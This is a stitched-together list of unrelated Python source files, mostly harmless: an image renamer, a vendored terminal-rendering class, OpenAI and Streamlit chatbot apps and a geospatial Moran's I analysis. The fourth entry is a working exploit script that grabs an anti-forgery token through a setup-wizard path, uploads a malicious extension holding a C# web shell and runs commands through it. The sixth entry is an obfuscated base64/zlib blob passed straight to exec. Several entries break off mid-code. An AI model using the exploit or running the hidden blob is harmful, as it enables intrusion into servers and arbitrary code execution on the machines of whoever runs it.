    "import os\r\n\r\ndef rename_images(source_folder, destination_folder):\r\n    # Get a list of all files in the source folder\r\n    files = os.listdir(source_folder)\r\n\r\n    # Iterate over each file\r\n    for id, file in enumerate(files):\r\n        # Check if the file is an image (you can add more image extensions if needed)\r\n        if file.endswith(\".jpg\") or file.endswith(\".png\"):\r\n            # Generate a new name for the file\r\n            # new_name = \"new_\" + file\r\n            new_name = f'main_{id:0>5d}.png'\r\n\r\n            # Build the full paths for the source and destination files\r\n            source_path = os.path.join(source_folder, file)\r\n            destination_path = os.path.join(destination_folder, new_name)\r\n\r\n            # Rename and move the file\r\n            os.rename(source_path, destination_path)\r\n\r\n# Specify the source and destination folders\r\nsource_folder = \"20240403mao/mao_45/images_copy\"\r\ndestination_folder = \"20240403mao/mao_45/images_new\"\r\n\r\nos.makedirs(destination_folder, exist_ok=True)\r\n\r\n# Call the function to rename and move the images\r\nrename_images(source_folder, destination_folder)",
    "from typing import Optional, TYPE_CHECKING\n\nfrom .segment import Segment\nfrom .style import StyleType\nfrom ._loop import loop_last\n\n\nif TYPE_CHECKING:\n    from .console import (\n        Console,\n        ConsoleOptions,\n        RenderResult,\n        RenderableType,\n        Group,\n    )\n\n\nclass Screen:\n    \"\"\"A renderable that fills the terminal screen and crops excess.\n\n    Args:\n        renderable (RenderableType): Child renderable.\n        style (StyleType, optional): Optional background style. Defaults to None.\n    \"\"\"\n\n    renderable: \"RenderableType\"\n\n    def __init__(\n        self,\n        *renderables: \"RenderableType\",\n        style: Optional[StyleType] = None,\n        application_mode: bool = False,\n    ) -> None:\n        from pip._vendor.rich.console import Group\n\n        self.renderable = Group(*renderables)\n        self.style = style\n        self.application_mode = application_mode\n\n    def __rich_console__(\n        self, console: \"Console\", options: \"ConsoleOptions\"\n    ) -> \"RenderResult\":\n        width, height = options.size\n        style = console.get_style(self.style) if self.style else None\n        render_options = options.update(width=width, height=height)\n        lines = console.render_lines(\n            self.renderable or \"\", render_options, style=style, pad=True\n        )\n        lines = Segment.set_shape(lines, width, height, style=style)\n        new_line = Segment(\"\\n\\r\") if self.application_mode else Segment.line()\n        for last, line in loop_last(lines):\n            yield from line\n            if not last:\n                yield new_line\n",
    "from openai import OpenAI\nfrom time import sleep\nimport PyPDF2\nimport sys\nimport os\n\nclient = OpenAI()\nstarting_assistant = \"\"\nstarting_thread = \"\"\n\n\ndef create_assistant(info):\n    if starting_assistant == \"\":\n        my_assistant = client.beta.assistants.create(\n            instructions=info,\n            name=\"MyQuickstartAssistant\",\n            model=\"gpt-3.5-turbo\",\n        )\n    else:\n        my_assistant = client.beta.assistants.retrieve(starting_assistant)\n\n    return my_assistant\n\n\ndef create_thread():\n    if starting_thread == \"\":\n        thread = client.beta.threads.create()\n    else:\n        thread = client.beta.threads.retrieve(starting_thread)\n\n    return thread\n\n\ndef send_message(thread_id, message):\n    thread_message = client.beta.threads.messages.create(\n        thread_id,\n        role=\"user\",\n        content=message,\n    )\n    return thread_message\n\n\ndef run_assistant(thread_id, assistant_id):\n    run = client.beta.threads.runs.create(\n        thread_id=thread_id, assistant_id=assistant_id\n    )\n    return run\n\n\ndef get_newest_message(thread_id):\n    thread_messages = client.beta.threads.messages.list(thread_id)\n    return thread_messages.data[0]\n\n\ndef get_run_status(thread_id, run_id):\n    run = client.beta.threads.runs.retrieve(thread_id=thread_id, run_id=run_id)\n    return run.status\n\n\ndef pdfFunctionality(text):\n    my_assistant = create_assistant(\"Provide resume feedback\")\n    my_thread = create_thread()\n    # latest place with file\n    file_path = sys.argv[1]\n    user_message = \"\"\n    try:\n        with open(file_path, \"r\") as file:\n            user_message += file.read()\n    except FileNotFoundError:\n        print(f\"File '{file_path}' not found\")\n\n    send_message(my_thread.id, text)\n    run = run_assistant(my_thread.id, my_assistant.id)\n    while run.status != \"completed\":\n        run.status = get_run_status(my_thread.id, run.id)\n        sleep(1)\n        print(\"\u23f3\", end=\"\\r\", flush=True)\n    sleep(0.5)\n    response = get_newest_message(my_thread.id)\n    print(\"Response:\", response.content[0].text.value)\n\n\ndef ATFFunctionality():\n    my_assistant = create_assistant(\"Extract ATS keywords from this job description\")\n    my_thread = create_thread()\n    # latest place with file\n    file_path = sys.argv[1]\n    user_message = \"\"\n    try:\n        with open(file_path, \"r\") as file:\n            user_message += file.read()\n    except FileNotFoundError:\n        print(f\"File '{file_path}' not found\")\n\n    send_message(my_thread.id, user_message)\n    run = run_assistant(my_thread.id, my_assistant.id)\n    while run.status != \"completed\":\n        run.status = get_run_status(my_thread.id, run.id)\n        sleep(1)\n        print(\"\u23f3\", end=\"\\r\", flush=True)\n    sleep(0.5)\n    response = get_newest_message(my_thread.id)\n    print(\"Response:\", response.content[0].text.value)\n\n\ndef main():\n    if len(sys.argv) < 2:\n        print(\n            \"Please provide the path to the input text file as a command line argument\"\n        )\n        sys.exit(1)\n\n    choice = input(\n        \"do you want to use the ATF functionalilty or the PDF functionality? (A/P) \"\n    )\n    if choice == \"A\" or choice == \"a\":\n        ATFFunctionality()\n    if choice == \"P\" or choice == \"p\":\n        current_file_path = os.path.abspath(__file__)\n        with open(\"./resumes/Redacted Resume 1.pdf\", \"rb\") as file:\n            reader = PyPDF2.PdfReader(file)\n            text = \"\"\n            for page in reader.pages:\n                # Extract text from each page\n                text += page.extract_text()\n        pdfFunctionality(text)\n\n\nif __name__ == \"__main__\":\n    main()\n",
    "import argparse\nimport base64\nimport re\nimport sys\nimport warnings\nfrom distutils.version import LooseVersion\nimport requests\nimport random\nimport string\nimport zipfile\nimport urllib3\n\nDELETE_STATUS=False\nwarnings.filterwarnings(\"ignore\", category=DeprecationWarning)\nurllib3.disable_warnings()\n\nexploit_header = {\n    \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36\"\n}\n\nGREEN = \"\\033[92m\"\nRESET = \"\\033[0m\"\ndef rand_text_hex(length):\n    return ''.join(random.choice('0123456789abcdef') for _ in range(length))\ndef rand_text_alpha_lower(length):\n    return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))\ndef rand_text_alpha(length):\n    return ''.join(random.choice(string.ascii_letters) for _ in range(length))\n\nplugin_guid = '-'.join([rand_text_hex(a) for a in [8, 4, 4, 4, 12]])\npayload_ashx = f\"{rand_text_alpha_lower(8)}.ashx\"\npayload_handler_class = rand_text_alpha(8)\npayload_psi_var = rand_text_alpha(8)\nsession = requests.Session()\n\ndef GetAntiForgeryToken(url, username, password):\n    try:\n        ##\u5982\u679c\u662f\u6b63\u7248\u7684\u8bdd\uff0c\u5219\u4e0d\u9700\u8981SetupWizard.aspx/\n        resp = session.get(url=url + \"/SetupWizard.aspx/Administration\", auth=(username, password), verify=False, headers=exploit_header, proxies=proxy)\n        antiForgeryToken = re.search(r'\"antiForgeryToken\"\\s*:\\s*\"([a-zA-Z0-9+/=]+)\"', resp.text).group(1)\n        return antiForgeryToken\n    except:\n        return None\n\ndef CreateExtension():\n    payload_data = f'''<% @ WebHandler Language=\"C#\" Class=\"{payload_handler_class}\" %>\nusing System;\nusing System.Web;\nusing System.Diagnostics;\npublic class {payload_handler_class} : IHttpHandler\n{{\n    public void ProcessRequest(HttpContext ctx)\n    {{\n        string command = ctx.Request.QueryString[\"cmd\"];\n        if (!string.IsNullOrEmpty(command))\n        {{\n            ExecuteCommand(command, ctx);\n        }}\n        else\n        {{\n            ctx.Response.ContentType = \"text/plain\";\n        }}\n    }}\n    private void ExecuteCommand(string cmd, HttpContext ctx)\n    {{\n        ProcessStartInfo {payload_psi_var} = new ProcessStartInfo();\n        {payload_psi_var}.FileName = \"cmd.exe\";\n        {payload_psi_var}.Arguments = $\"/c {{cmd}}\";\n        {payload_psi_var}.RedirectStandardOutput = true;\n        {payload_psi_var}.UseShellExecute = false;\n        using (Process process = new Process())\n        {{\n            process.StartInfo = {payload_psi_var};\n            process.Start();\n            string output = process.StandardOutput.ReadToEnd();\n            process.WaitForExit();\n            ctx.Response.ContentType = \"text/plain\";\n            ctx.Response.Write(output);\n        }}\n    }}\n    public bool IsReusable {{ get {{ return true; }} }}\n}}'''\n    manifest_data = f'''<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<ExtensionManifest>\n  <Version>1</Version>\n  <Name>{rand_text_alpha_lower(8)}</Name>\n  <Author>{rand_text_alpha_lower(8)}</Author>\n  <ShortDescription>{rand_text_alpha_lower(8)}</ShortDescription>\n  <LoadMessage>null</LoadMessage>\n  <Components>\n    <WebServiceReference SourceFile=\"{payload_ashx}\"/>\n  </Components>\n</ExtensionManifest>'''\n    zip_resources = zipfile.ZipFile(\"resources.zip\", 'w')\n    zip_resources.writestr(f\"{plugin_guid}/Manifest.xml\", manifest_data)\n    zip_resources.writestr(f\"{plugin_guid}/{payload_ashx}\", payload_data)\n    zip_resources.close()\n\ndef UploadExtension(url, anti_forgery_token):\n    with open(\"resources.zip\", \"rb\") as f:\n        zip_data = f.read()\n    zip_data_base64 = base64.b64encode(zip_data).decode()\n    headers = {\n        \"X-Anti-Forgery-Token\": anti_forgery_token,\n        \"Content-Type\": \"application/json\",\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36\"\n    }\n    url = url + \"/Services/ExtensionService.ashx/InstallExtension\"\n    session.cookies.update({\"settings\": \"%7B%22collapsedPanelMap%22%3A%7B%22Inactive%22%3Atrue%7D%7D\"})\n    try:\n        response = session.post(url=url, data=f\"[\\\"{zip_data_base64}\\\"]\", headers=headers, verify=False, proxies=proxy)\n        if response.status_code == 200:\n            print(f\"[+] The malicious extension was uploaded successfully, with the ID: {plugin_guid}\")\n        else:\n            print(\"[-] Malicious extension upload failed, please check the network and try again or try to exploit manually\")\n    except Exception as err:\n        print(\"[-] Error in func <UploadExtension>, error message: \" + str(err))\n\ndef ExecuteCommand(url):\n\n        resp = session.get(url=url + f\"/App_Extensions/{plugin_guid}/{payload_ashx}\", headers=exploit_header, verify=False, proxies=proxy)\n        if resp.status_code == 200:\n            print(f\"[+] Shell Url: {url + f'/App_Extensions/{plugin_guid}/{payload_ashx}'}\")\n            print(\"[+] \u6267\u884c\u56fa\u5b9a\u547d\u4ee4 whoami\")\n            cmd = 'whoami'\n            resp = session.get(url=url + f\"/App_Extensions/{plugin_guid}/{payload_ashx}?cmd={cmd}\", headers=exploit_",
    "import streamlit as st\nfrom dotenv import load_dotenv\nfrom PyPDF2 import PdfReader\nfrom langchain.text_splitter import CharacterTextSplitter\nfrom langchain_community.embeddings import OpenAIEmbeddings\nfrom langchain_community.vectorstores import FAISS\nfrom langchain_community.chat_models import ChatOpenAI\nfrom langchain.memory import ConversationBufferMemory\nfrom langchain.chains import ConversationalRetrievalChain\nfrom htmlTemplates import css, bot_template, user_template\n\n\ndef get_pdf_text(pdf_docs):\n    text = \"\"\n    for pdf in pdf_docs:\n        # Manually create a PdfReader instance\n        pdf_reader = PdfReader(pdf)\n        for page in pdf_reader.pages:\n            page_text = page.extract_text()\n            if page_text:  # Ensure there's text to add\n                text += page_text\n        # No need to explicitly close the PdfReader as it does not lock the file\n    return text\n\n\ndef get_text_chunks(text):\n    text_splitter = CharacterTextSplitter(\n        separator=\"\\n\",\n        chunk_size=1000,\n        chunk_overlap=200,\n        length_function=len\n    )\n    return text_splitter.split_text(text)\n\n\ndef get_vectorstore(text_chunks):\n    embeddings = OpenAIEmbeddings()\n    return FAISS.from_texts(texts=text_chunks, embedding=embeddings)\n\n\ndef get_conversation_chain(vectorstore):\n    llm = ChatOpenAI()\n    memory = ConversationBufferMemory(memory_key='chat_history', return_messages=True)\n    return ConversationalRetrievalChain.from_llm(llm=llm, retriever=vectorstore.as_retriever(), memory=memory)\n\n\ndef handle_userinput(user_question):\n    response = st.session_state.conversation({'question': user_question})\n    st.session_state.chat_history = response['chat_history']\n    display_chat_messages(st.session_state.chat_history)\n\n\ndef display_chat_messages(messages):\n    for msg_index, message in enumerate(messages):\n        if msg_index % 2 == 0:\n            st.write(user_template.replace(\n                \"{{MSG}}\", message.content), unsafe_allow_html=True)\n        else:\n            st.write(bot_template.replace(\n                \"{{MSG}}\", message.content), unsafe_allow_html=True)\n\n\ndef main_page():\n    st.header(\"Chat with multiple PDFs :books:\")\n    user_question = st.text_input(\"Ask a question about your documents:\")\n    if user_question:\n        handle_userinput(user_question)\n\n\ndef about_page():\n    st.title(\"About\")\n    st.markdown(\"\"\"\n    This page is about the project and the developers involved.\n    - **Project**: Description of the project.\n    - **Developers**: Who developed the project.\n    \"\"\")\n\n\ndef home_page():\n    st.title(\"Welcome to the PDF Chatbot, hosted by 'David'!\")\n    st.write(\"This is a Streamlit intergrated webapp that allows you to chat with a 'David' about the contents of multiple PDF documents of your choice.\")\n    st.write(\"To get started, upload your PDF documents and click the 'Process' button. Once the processing is complete, you can ask 'David' questions about the contents of the PDFs.\")\n    st.write(\"You can navigate to the 'Streamlit Chatbot Page' to start chatting with 'David'...\")\n    st.write(\"You can also navigate to the 'About' page to learn more about the project and the developers involved.\")\n    st.write(\"Enjoy chatting with 'David'! :smiley:\")\n\n\ndef main():\n    load_dotenv()\n    st.set_page_config(page_title=\"Chat with multiple PDFs\", page_icon=\":books:\")\n    st.write(css, unsafe_allow_html=True)\n\n    if \"chat_history\" not in st.session_state:\n        st.session_state.chat_history = []\n\n    # Define pages in the main function\n    pages = {\n        \"Home\": home_page,\n        \"About\": about_page,\n        \"Streamlit Chatbot Page\": main_page\n    }\n\n    # Navigation menu at the top of the sidebar\n    with st.sidebar:\n        page = st.selectbox(\"Navigate\", list(pages.keys()))\n\n        # Add a custom \"margin\" (spacing) below the navigation\n        st.markdown(\"<div style='margin-bottom: 7em;'></div>\", unsafe_allow_html=True)\n\n        # File uploader moved below the navigation menu\n        pdf_docs = st.file_uploader(\"Upload your PDFs here\", accept_multiple_files=True)\n        if st.button(\"Process\"):\n            with st.spinner(\"Processing...\"):\n                if pdf_docs:\n                    raw_text = get_pdf_text(pdf_docs)\n                    text_chunks = get_text_chunks(raw_text)\n                    vectorstore = get_vectorstore(text_chunks)\n                    st.session_state.conversation = get_conversation_chain(vectorstore)\n                    st.success(\"Ready to chat!\")\n                else:\n                    st.error(\"Please upload at least one PDF document.\")\n\n    # Call the page rendering function based on the user's selection\n    pages[page]()\n\n\nif __name__ == '__main__':\n    main()\n",
    "_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=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",
    "### Second Part: Lisa Analysis\n## Functions \n\ndef read_shapefiles(pipe_shapefile_path, failures_shapefile_path):\n  pipe_gdf = gpd.read_file(pipe_shapefile_path).set_crs('EPSG:2100')\n  failures_gdf = gpd.read_file(failures_shapefile_path).set_crs('EPSG:2100')\n  return pipe_gdf, failures_gdf\n\n\ndef create_fishnet(square_size, pipe_gdf):\n\n  total_bounds = pipe_gdf.total_bounds\n  minX, minY, maxX, maxY = total_bounds\n  x, y = (minX, minY)\n  geom_array = []\n\n  while y <= maxY:\n      while x <= maxX:\n          geom = geometry.Polygon([(x, y), (x, y + square_size), (x + square_size, y + square_size), (x + square_size, y), (x, y)])\n          geom_array.append(geom)\n          x += square_size\n      x = minX\n      y += square_size\n\n  fishnet = gpd.GeoDataFrame(geom_array, columns=['geometry']).set_crs('EPSG:2100')\n  return fishnet\n\n\ndef spatial_autocorrelation_analysis(lower_bound_cell, upper_bound_cell, weight_avg_combined_metric, weight_failures, output_path):\n  results = []\n\n  pipe_gdf, failures_gdf = read_shapefiles(pipe_shapefile_path, failures_shapefile_path)\n\n  for square_size in range(lower_bound_cell, upper_bound_cell+100, 100):\n      fishnet = create_fishnet(square_size, pipe_gdf)\n\n      # Perform spatial join to count failures per feature of the fishnet\n      fishnet_failures = fishnet.join(\n          gpd.sjoin(failures_gdf, fishnet).groupby(\"index_right\").size().rename(\"failures\"),\n          how=\"left\",\n      )\n\n      fishnet_failures = fishnet_failures.dropna()\n\n      # Perform spatial join with pipe_gdf to calculate the average Combined Metric per fishnet square\n      pipe_metrics = gpd.sjoin(pipe_gdf, fishnet_failures, how='inner', predicate='intersects')\n      avg_metrics_per_square = pipe_metrics.groupby(\"index_right\")['cm'].mean()\n\n      # Add the average Combined Metric to the fishnet_failures GeoDataFrame\n      fishnet_failures['avg_combined_metric'] = fishnet_failures.index.map(avg_metrics_per_square)\n\n      # Standardize the 'failures' column from 0 to 1\n      min_failures = fishnet_failures['failures'].min()\n      max_failures = fishnet_failures['failures'].max()\n      fishnet_failures['failures_standardized'] = (fishnet_failures['failures'] - min_failures) / (max_failures - min_failures)\n\n      # Add the weighted average column\n      fishnet_failures['weighted_avg'] = (\n          fishnet_failures['avg_combined_metric'] * weight_avg_combined_metric +\n          fishnet_failures['failures_standardized'] * weight_failures\n      ) / (weight_avg_combined_metric + weight_failures)\n\n      # Store fishnet_failures as an instance variable\n      # fishnet_failures = fishnet_failures\n\n      # Create static choropleth maps (Equal intervals, Quantiles, Natural Breaks)\n      # Ensure that the create_choropleth_maps method can handle the new column\n      create_choropleth_maps(fishnet_failures, square_size, output_path)\n\n      # Calculate global Moran's I and store results\n      y = fishnet_failures['weighted_avg']\n      w = lps.weights.Queen.from_dataframe(fishnet_failures, use_index = False)\n      w.transform = 'r'\n      moran = Moran(y, w)\n      results.append((square_size, moran.I, moran.p_sim, moran.z_sim))\n\n  # Print results\n  best_square_size = find_best_square_size(results)\n  print_results(results, best_square_size, output_path)\n\n  return results, best_square_size\n\n\ndef create_choropleth_maps(fishnet_failures, square_size, output_path):\n  # fig, ax = plt.subplots(figsize=(12, 10))\n  # fishnet_failures.plot(column='weighted_avg', scheme='equal_interval', k=10, cmap='RdYlGn_r', legend=True, ax=ax,\n  #                   legend_kwds={'loc':'center left', 'bbox_to_anchor':(1,0.5), 'fmt':\"{:.2f}\", 'interval':True})\n  # fishnet_failures.boundary.plot(ax=ax)\n  # plt.title(f'Average criticality metric per fishnet cell (size = {square_size} m x {square_size} m), Equal intervals', fontsize = 18)\n  # plt.axis('off')\n  # plt.tight_layout()\n  # plt.savefig(output_path + '_' + str(square_size) + '_' +'equal_intervals_coropleth_map.png')\n\n  # Create a static choropleth map of the failure number per grid cell of the fishnet (Quantiles)\n  fig, ax = plt.subplots(figsize=(12, 10))\n  fishnet_failures.plot(column='weighted_avg', scheme='quantiles', k=10, cmap='RdYlGn_r', legend=True, ax=ax,\n                    legend_kwds={'loc':'center left', 'bbox_to_anchor':(1,0.5), 'fmt':\"{:.2f}\", 'interval':True})\n  fishnet_failures.boundary.plot(ax=ax)\n  plt.title(f'Average criticality metric per fishnet cell (size = {square_size} m x {square_size} m), Quantiles', fontsize = 18)\n  plt.axis('off')\n  plt.tight_layout()\n  plt.savefig(output_path + str(square_size) + '_' +'coropleth_map.png')\n\n  # # Create a static choropleth map of the failure number per grid cell of the fishnet (Natural Breaks)\n  # fig, ax = plt.subplots(figsize=(12, 10))\n  # fishnet_failures.plot(column='weighted_avg', scheme='natural_breaks', k=10, cmap='RdYlGn_r', legend=True, ax=ax,\n  #                   legend_kwds={'loc':'center left', 'bbox_to_anchor':(1,0.5), 'f",
    "from dotenv import load_dotenv\nimport os\n\nimport streamlit as st\n\nfrom langchain.chains import ConversationChain\nfrom langchain.chains.conversation.memory import ConversationBufferWindowMemory\nfrom langchain_groq import ChatGroq\n\n\ndef main():\n    \"\"\"\n    This function is the main entry point of the application. It sets up the Groq client, the Streamlit interface,\n    and handles the chat interaction.\n    \"\"\"\n\n    # Get Groq API key\n    load_dotenv()  # Load environment variables from .env file\n    groq_api_key = os.getenv(\"GROQ_API_KEY\")\n\n    # Display the Groq logo\n    spacer, col = st.columns([5, 1])\n    with col:\n        st.image('groqcloud_darkmode.png')\n\n    # The title and greeting message of the Streamlit application\n    st.title(\"Chat with Groq!\")\n    st.write(\n        \"Hello! I'm your friendly Groq chatbot. I can help answer your questions, provide information, or just chat. \"\n        \"I'm also super fast! Let's start our conversation!\")\n\n    # Add customization options to the sidebar\n    st.sidebar.title('Customization')\n    model = st.sidebar.selectbox(\n        'Choose a model',\n        ['mixtral-8x7b-32768', 'llama2-70b-4096']\n    )\n    conversational_memory_length = st.sidebar.slider('Conversational memory length:', 1, 10, value=5)\n\n    memory = ConversationBufferWindowMemory(k=conversational_memory_length)\n\n    user_question = st.text_input(\"Ask a question:\")\n\n    # session state variable\n    if 'chat_history' not in st.session_state:\n        st.session_state.chat_history = []\n    else:\n        for message in st.session_state.chat_history:\n            